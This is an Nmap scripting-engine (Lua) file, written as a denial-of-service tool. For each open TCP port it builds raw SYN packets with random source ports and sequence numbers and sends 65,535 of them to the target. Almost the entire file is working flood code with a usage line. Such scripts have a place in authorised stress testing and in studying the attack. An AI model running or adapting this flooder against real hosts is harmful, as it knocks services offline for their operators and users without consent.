local dns = require "dns"
local nmap = require "nmap"
local packet = require "packet"
local ipOps = require "ipOps"
local stdnse = require "stdnse"

description = [[
This NSE preforms a DoS attack by SYN Flooding a remote server
]]

---
-- @usage
-- sudo nmap -sn <target> --script syn-flood --script-args='target=www.example.com'
--
-- @output
--
-- @args syn-flood.target a LAN or routed target responding to IP SYN Flood
--

author = "Noam Rathaus"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos"}

portrule = function(host, port)
	local service = nmap.get_port_state(host, port)

	return service ~= nil
		and service.state == "open"
		and port.protocol == "tcp"
		and port.state == "open"
end

stdnse.debug1('Started 88')

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)
  stdnse.debug1("Started on " .. host.ip .. " and " .. port.number)

  local ifname = nmap.get_interface() or host.interface
  if ( not(ifname) ) then
    return fail("Failed to determine the network interface name")
  end

  local target = ipOps.ip_to_bin(host.ip)
  if ( not(target) ) then
    local status
    status, target = dns.query(host, { dtype='A' })
    if ( not(status) ) then
      return fail(("Failed to lookup hostname: %s"):format(host))
    end
  else
    target = host
  end
  
  stdnse.verbose1("testing SYN on port " .. port.number)
  local iface = nmap.get_interface_info(ifname)
  local dnet = nmap.new_dnet()
  dnet:ethernet_open(iface.device)
  for count = 1, 65535, 1 do
   if count % 100 == 0 then
    stdnse.verbose1(("iteration: %d"):format(count))
   end
   tcpRequest(dnet, host, port.number, target)
  end
  dnet:ethernet_close()

end

--- Updates a TCP Packet object
-- @param tcp The TCP object
local updatepkt = function(tcp, dport)
  tcp:tcp_set_sport(math.random(0x401, 0xffff))
  tcp:tcp_set_dport(dport)
  tcp:tcp_set_seq(math.random(1, 0x7fffffff))
  tcp:tcp_set_flags(2)

  tcp:tcp_count_checksum(tcp.ip_len)
  tcp:ip_count_checksum()
end

local genericpkt = function(host, port)
  local pkt = stdnse.fromhex(
  "4500 002c 55d1 0000 8006 0000 0000 0000" ..
  "0000 0000 0000 0000 0000 0000 0000 0000" ..
  "6002 0c00 0000 0000 0204 05b4"
  )

  local tcp = packet.Packet:new(pkt, pkt:len())

  tcp:ip_set_bin_src(host.bin_ip_src)
  tcp:ip_set_bin_dst(host.bin_ip)
  
  updatepkt(tcp, port)

  return tcp
end

tcpRequest = function(dnet, host, port, addr)
  local tcp = genericpkt(host, port)

  local try = nmap.new_try()

  try(dnet:ip_open())
  try(dnet:ip_send(tcp.buf, host))
--- We should receive an ACK back, which we won't respond to or care about
  return 1
end
